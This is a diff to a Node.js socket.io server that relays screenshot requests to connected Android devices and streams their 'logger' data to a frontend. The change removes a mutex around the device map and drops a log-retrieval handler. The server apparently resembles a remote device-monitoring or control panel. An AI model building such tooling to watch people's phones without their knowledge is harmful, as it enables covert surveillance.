@@ -11,36 +11,6 @@ const pendingScreenshots = new Map(); // Map<device_uuid, {frontend_socket_id, t
 const pendingScreenshotResponses = new Map(); // Map<device_uuid, timeout>
 const SCREENSHOT_TIMEOUT = 30000;
 
-// Simple mutex for devices map synchronization
-class Mutex {
-    constructor() {
-        this.locked = false;
-        this.waiting = [];
-    }
-
-    async acquire() {
-        return new Promise((resolve) => {
-            if (!this.locked) {
-                this.locked = true;
-                resolve();
-            } else {
-                this.waiting.push(resolve);
-            }
-        });
-    }
-
-    release() {
-        if (this.waiting.length > 0) {
-            const next = this.waiting.shift();
-            next();
-        } else {
-            this.locked = false;
-        }
-    }
-}
-
-const devicesMutex = new Mutex();
-
 // Function to clean up expired screenshot requests
 function cleanupExpiredScreenshotRequests() {
     const now = Date.now();
@@ -117,35 +87,29 @@ androidIo.on("connection", async (socket) => {
 
         socket.deviceUuid = deviceUuid;
 
-        // Synchronize access to devices map
-        await devicesMutex.acquire();
-        try {
-            let device = devices.get(deviceUuid);
-            if (device) {
-                device.info = data;
-                device.socket = socket;
-                // Clean up any stale screenshot requests for this device
-                if (pendingScreenshots.has(deviceUuid)) {
-                    console.log(chalk.yellow(`Cleaning up stale screenshot request for reconnected device ${deviceUuid}`));
-                    pendingScreenshots.delete(deviceUuid);
-                }
-                if (pendingScreenshotResponses.has(deviceUuid)) {
-                    clearTimeout(pendingScreenshotResponses.get(deviceUuid));
-                    pendingScreenshotResponses.delete(deviceUuid);
-                }
-                if (!device.logs) {
-                    device.logs = [];
-                }
-            } else {
-                device = {
-                    info: data,
-                    socket: socket,
-                    logs: []
-                };
-                devices.set(deviceUuid, device);
+        let device = devices.get(deviceUuid);
+        if (device) {
+            device.info = data;
+            device.socket = socket;
+            // Clean up any stale screenshot requests for this device
+            if (pendingScreenshots.has(deviceUuid)) {
+                console.log(chalk.yellow(`Cleaning up stale screenshot request for reconnected device ${deviceUuid}`));
+                pendingScreenshots.delete(deviceUuid);
             }
-        } finally {
-            devicesMutex.release();
+            if (pendingScreenshotResponses.has(deviceUuid)) {
+                clearTimeout(pendingScreenshotResponses.get(deviceUuid));
+                pendingScreenshotResponses.delete(deviceUuid);
+            }
+            if (!device.logs) {
+                device.logs = [];
+            }
+        } else {
+            device = {
+                info: data,
+                socket: socket,
+                logs: []
+            };
+            devices.set(deviceUuid, device);
         }
 
         // UPSERT device info in DB
@@ -157,16 +121,11 @@ androidIo.on("connection", async (socket) => {
         console.log(chalk.green(`[+] Android device Connected (${deviceUuid}) => ${socket.request.connection.remoteAddress}:${socket.request.connection.remotePort}`))
 
         // Broadcast updated device list to frontend
-        await devicesMutex.acquire();
-        try {
-            const deviceList = Array.from(devices.values()).map((d) => ({
-                ...d.info,
-                ID: d.info.device_uuid
-            })).slice(0, 20);
-            frontendIo.emit("devices", deviceList);
-        } finally {
-            devicesMutex.release();
-        }
+        const deviceList = Array.from(devices.values()).map((d) => ({
+            ...d.info,
+            ID: d.info.device_uuid
+        })).slice(0, 20);
+        frontendIo.emit("devices", deviceList);
 
         socket.on("disconnect", async (reason) => {
             const deviceUuid = socket.deviceUuid;
@@ -184,42 +143,37 @@ androidIo.on("connection", async (socket) => {
             }
 
             try {
-                await devicesMutex.acquire();
-                try {
-                    const device = devices.get(deviceUuid);
-                    if (device) {
-                        device.socket = null;
-                        // Clean up logs to prevent memory leaks
-                        if (device.logs && device.logs.length > 100) {
-                            device.logs = device.logs.slice(-100);
-                        }
+                const device = devices.get(deviceUuid);
+                if (device) {
+                    device.socket = null;
+                    // Clean up logs to prevent memory leaks
+                    if (device.logs && device.logs.length > 100) {
+                        device.logs = device.logs.slice(-100);
                     }
-
-                    // Clean up any pending screenshot requests for this device
-                    if (pendingScreenshots.has(deviceUuid)) {
-                        const request = pendingScreenshots.get(deviceUuid);
-                        const requestingSocket = frontendIo.sockets.sockets.get(request.frontend_socket_id);
-                        if (requestingSocket) {
-                            requestingSocket.emit("screenshot_error", {
-                                device_uuid: deviceUuid,
-                                error: "Device disconnected while taking screenshot"
-                            });
-                        }
-                        pendingScreenshots.delete(deviceUuid);
-                    }
-
-                    // Update last_seen in DB
-                    await db.run('UPDATE devices SET last_seen = ? WHERE device_uuid = ?', Date.now(), deviceUuid);
-
-                    // Broadcast updated device list
-                    const deviceList = Array.from(devices.values()).map((d) => ({
-                        ...d.info,
-                        ID: d.info.device_uuid
-                    })).slice(0, 20);
-                    frontendIo.emit("devices", deviceList);
-                } finally {
-                    devicesMutex.release();
                 }
+
+                // Clean up any pending screenshot requests for this device
+                if (pendingScreenshots.has(deviceUuid)) {
+                    const request = pendingScreenshots.get(deviceUuid);
+                    const requestingSocket = frontendIo.sockets.sockets.get(request.frontend_socket_id);
+                    if (requestingSocket) {
+                        requestingSocket.emit("screenshot_error", {
+                            device_uuid: deviceUuid,
+                            error: "Device disconnected while taking screenshot"
+                        });
+                    }
+                    pendingScreenshots.delete(deviceUuid);
+                }
+
+                // Update last_seen in DB
+                await db.run('UPDATE devices SET last_seen = ? WHERE device_uuid = ?', Date.now(), deviceUuid);
+
+                // Broadcast updated device list
+                const deviceList = Array.from(devices.values()).map((d) => ({
+                    ...d.info,
+                    ID: d.info.device_uuid
+                })).slice(0, 20);
+                frontendIo.emit("devices", deviceList);
             } catch (error) {
                 console.error('Error handling device disconnect:', error);
             }
@@ -241,20 +195,14 @@ androidIo.on("connection", async (socket) => {
             }
 
             try {
-                await devicesMutex.acquire();
-                let device;
-                try {
-                    device = devices.get(deviceUuid);
-                    if (!device) {
-                        console.log(chalk.yellow(`[!] Received logger data from unknown device ${deviceUuid}, ignoring`));
-                        return;
-                    }
-
-                    device.logs.push({ timestamp: Date.now(), log: data });
-                    device.lastSeen = Date.now();
-                } finally {
-                    devicesMutex.release();
+                let device = devices.get(deviceUuid);
+                if (!device) {
+                    console.log(chalk.yellow(`[!] Received logger data from unknown device ${deviceUuid}, ignoring`));
+                    return;
                 }
+
+                device.logs.push({ timestamp: Date.now(), log: data });
+                device.lastSeen = Date.now();
 
                 // Emit to frontend
                 frontendIo.emit("logger", { device: deviceUuid, log: data });
@@ -298,14 +246,9 @@ androidIo.on("connection", async (socket) => {
                 }
 
                 // Update device last seen
-                await devicesMutex.acquire();
-                try {
-                    const device = devices.get(deviceUuid);
-                    if (device) {
-                        device.lastSeen = Date.now();
-                    }
-                } finally {
-                    devicesMutex.release();
+                const device = devices.get(deviceUuid);
+                if (device) {
+                    device.lastSeen = Date.now();
                 }
 
                 // Generate filename and save
@@ -367,44 +310,15 @@ frontendIo.on("connection", async (socket) => {
     console.log(chalk.greenBright(`[+] Frontend Connected (${socket.id})`))
 
     try {
-        await devicesMutex.acquire();
-        try {
-            const deviceList = Array.from(devices.values()).map((d) => ({
-                ...d.info,
-                ID: d.info.device_uuid
-            })).slice(0, 20);
-            socket.emit("devices", deviceList);
-        } finally {
-            devicesMutex.release();
-        }
+        const deviceList = Array.from(devices.values()).map((d) => ({
+            ...d.info,
+            ID: d.info.device_uuid
+        })).slice(0, 20);
+        socket.emit("devices", deviceList);
     } catch (error) {
         console.error('Error sending initial device list to frontend:', error);
         socket.emit("devices", []);
     }
-
-    socket.on("get_device_logs", async (id) => {
-        if (!id) {
-            socket.emit("device_logs", []);
-            return;
-        }
-
-        try {
-            await devicesMutex.acquire();
-            try {
-                const device = devices.get(id);
-                if (device && device.logs) {
-                    socket.emit("device_logs", device.logs.map(l => l.log));
-                } else {
-                    socket.emit("device_logs", []);
-                }
-            } finally {
-                devicesMutex.release();
-            }
-        } catch (error) {
-            console.error('Error getting device logs:', error);
-            socket.emit("device_logs", []);
-        }
-    });
 
     socket.on("screenshot_req", async (deviceId) => {
         deviceId = (typeof deviceId === 'string' ? deviceId.trim() : deviceId);
@@ -417,67 +331,62 @@ frontendIo.on("connection", async (socket) => {
         console.log(`Relaying screenshot request to device: ${deviceId} from frontend: ${socket.id}`);
 
         try {
-            await devicesMutex.acquire();
-            try {
-                let device = devices.get(deviceId);
+            let device = devices.get(deviceId);
 
-                if (device && !device.socket) {
-                    const fallback = Array.from(devices.values()).find((d) => d.info && d.info.device_uuid === deviceId && d.socket);
-                    if (fallback) {
-                        device = fallback;
-                        devices.set(deviceId, fallback);
-                    }
+            if (device && !device.socket) {
+                const fallback = Array.from(devices.values()).find((d) => d.info && d.info.device_uuid === deviceId && d.socket);
+                if (fallback) {
+                    device = fallback;
+                    devices.set(deviceId, fallback);
                 }
+            }
 
-                if (device && device.socket) {
-                    // Check if there's already a pending request for this device
-                    const existingRequest = pendingScreenshots.get(deviceId);
+            if (device && device.socket) {
+                // Check if there's already a pending request for this device
+                const existingRequest = pendingScreenshots.get(deviceId);
 
-                    if (existingRequest) {
-                        const now = Date.now();
-                        if (now - existingRequest.timestamp > SCREENSHOT_TIMEOUT) {
-                            console.log(chalk.yellow(`Screenshot request timed out for device ${deviceId}, allowing new request from ${socket.id}`));
-                            pendingScreenshots.delete(deviceId);
-                        } else {
-                            // Another frontend already requested - reject this one
-                            console.log(chalk.yellow(`Screenshot already pending for device ${deviceId} from frontend ${existingRequest.frontend_socket_id}, rejecting request from ${socket.id}`));
-                            socket.emit("screenshot_error", {
-                                device_uuid: deviceId,
-                                error: "Screenshot already in progress for this device"
-                            });
-                            return;
-                        }
-                    }
-
-                    // Store the request
-                    pendingScreenshots.set(deviceId, {
-                        frontend_socket_id: socket.id,
-                        timestamp: Date.now()
-                    });
-                    device.socket.emit("screenshot");
-                    console.log(chalk.green(`Screenshot request sent to device ${deviceId} for frontend ${socket.id}`));
-
-                    // Set timeout for response
-                    pendingScreenshotResponses.set(deviceId, setTimeout(async () => {
-                        console.log(chalk.red(`Screenshot response timeout for device ${deviceId}, clearing pending state and notifying frontend`));
-
-                        const request = pendingScreenshots.get(deviceId);
-                        if (request) {
-                            const requestingSocket = frontendIo.sockets?.get(request.frontend_socket_id);
-                            if (requestingSocket) {
-                                requestingSocket.emit("screenshot_error", { device_uuid: deviceId, error: "Screenshot response timed out" });
-                            }
-                        }
-
+                if (existingRequest) {
+                    const now = Date.now();
+                    if (now - existingRequest.timestamp > SCREENSHOT_TIMEOUT) {
+                        console.log(chalk.yellow(`Screenshot request timed out for device ${deviceId}, allowing new request from ${socket.id}`));
                         pendingScreenshots.delete(deviceId);
-                        pendingScreenshotResponses.delete(deviceId);
-                    }, 10000));
-                } else {
-                    console.log(chalk.red(`Device ${deviceId} not found, socket disconnected, or not connected`));
-                    socket.emit("screenshot_error", { device_uuid: deviceId, error: "Device not available" });
+                    } else {
+                        // Another frontend already requested - reject this one
+                        console.log(chalk.yellow(`Screenshot already pending for device ${deviceId} from frontend ${existingRequest.frontend_socket_id}, rejecting request from ${socket.id}`));
+                        socket.emit("screenshot_error", {
+                            device_uuid: deviceId,
+                            error: "Screenshot already in progress for this device"
+                        });
+                        return;
+                    }
                 }
-            } finally {
-                devicesMutex.release();
+
+                // Store the request
+                pendingScreenshots.set(deviceId, {
+                    frontend_socket_id: socket.id,
+                    timestamp: Date.now()
+                });
+                device.socket.emit("screenshot");
+                console.log(chalk.green(`Screenshot request sent to device ${deviceId} for frontend ${socket.id}`));
+
+                // Set timeout for response
+                pendingScreenshotResponses.set(deviceId, setTimeout(async () => {
+                    console.log(chalk.red(`Screenshot response timeout for device ${deviceId}, clearing pending state and notifying frontend`));
+
+                    const request = pendingScreenshots.get(deviceId);
+                    if (request) {
+                        const requestingSocket = frontendIo.sockets?.get(request.frontend_socket_id);
+                        if (requestingSocket) {
+                            requestingSocket.emit("screenshot_error", { device_uuid: deviceId, error: "Screenshot response timed out" });
+                        }
+                    }
+
+                    pendingScreenshots.delete(deviceId);
+                    pendingScreenshotResponses.delete(deviceId);
+                }, 10000));
+            } else {
+                console.log(chalk.red(`Device ${deviceId} not found, socket disconnected, or not connected`));
+                socket.emit("screenshot_error", { device_uuid: deviceId, error: "Device not available" });
             }
         } catch (error) {
             console.error('Error handling screenshot request:', error);
@@ -492,16 +401,11 @@ frontendIo.on("connection", async (socket) => {
         }
 
         try {
-            await devicesMutex.acquire();
-            try {
-                const device = devices.get(deviceId);
-                if (device) {
-                    socket.emit("device_info", device.info);
-                } else {
-                    socket.emit("device_info_error", { error: "Device not found" });
-                }
-            } finally {
-                devicesMutex.release();
+            const device = devices.get(deviceId);
+            if (device) {
+                socket.emit("device_info", device.info);
+            } else {
+                socket.emit("device_info_error", { error: "Device not found" });
             }
         } catch (error) {
             console.error('Error getting device info:', error);
